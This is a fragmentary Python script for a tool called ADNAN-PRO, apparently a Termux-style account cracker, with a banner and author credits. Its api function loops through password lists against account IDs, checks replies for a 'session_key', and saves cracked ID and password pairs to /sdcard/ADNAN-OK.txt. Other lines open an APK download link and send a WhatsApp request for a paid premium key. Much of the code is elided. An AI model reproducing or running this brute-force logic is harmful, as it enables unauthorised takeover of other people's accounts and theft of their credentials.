...
logo=("""\033[1;37m  
 ...
 .d8b.  d8888b. d8b   db  .d8b.  d8b   db 
d8' `8b 88  `8D 888o  88 d8' `8b 888o  88 
88ooo88 88   88 88V8o 88 88ooo88 88V8o 88 
88~~~88 88   88 88 V8o88 88~~~88 88 V8o88 
88   88 88  .8D 88  V888 88   88 88  V888 
YP   YP Y8888D' VP   V8P YP   YP VP   V8P                                                                                                                                                                        
-------------------------------------------
 Author    : ADNAN-CHOWDHURY
 Github    : ADNAN-XD
 Facebook  : MR ADNAN KING
 Tool Name : ADNAN-PRO
 Type type : FREE
 Version   : 1.9.8
--------------------------------------------
 ADNAN Pro version 1.9.8
        ...
        #       chk()
                ...
                if x == ("sex"):
                        ...
                        if xd in ['1','01']:
                                ...
                                os.system('xdg-open https://mediafire.com/file/y1wvgc2zqqunxbn/ADNAN_VPN1.0.apk/file');menu()
                        elif xd in ['8','08']:
                        ...
                        linex()
                        tks = ("Hi ADNAN Sir, I Need To Buy Your Paid ADNAN PRO Tools Version 1.9.0 Premium Please Accept My Key To Premium :)\n\n Name :- "+name+"\n Key :- "+fkeyx)
                        subprocess.check_output(["am", "start", url_wa+(tks)]);time.sleep(2)
                        print(' Run :  python ADNAN.py')
                        exit()
        except ValueError:
                exit()
        except requests.exceptions.ConnectionError:
...
def api(ids,names,passlist):
                try:
                        ...
                        for pw in passlist:
                                ...
                                q = json.loads(po)
                                if 'session_key' in q:
                                        print('\r\r\033[1;32m [ADNAN-OK] '+ids+' | '+pas+'\033[1;97m')
                                        open('/sdcard/ADNAN-OK.txt','a').write(ids+'|'+pas+'\n')
                                        oks.append(ids)
                                        break
                ...
                try:
                        ...
                        for pas in passlist:
                                ...
                                if 'session_key' in q:
                                        uid=str(q['uid'])
                                        try:
                                                okk=open('/sdcard/ADNAN-OK.txt','r').read()
                                                if uid in okk:pass
                                                else:
                                                        print('\r\r\033[1;32m [ADNAN-OK] '+uid+' | '+pas+'\033[1;97m')
                                                        open('/sdcard/ADNAN-OK.txt','a').write(uid+'|'+pas+'\n')
                                                        oks.append(ids)
                                                        break
                                        except:
                                                print('\r\r\033[1;32m [ADNAN-OK] '+uid+' | '+pas+'\033[1;97m')
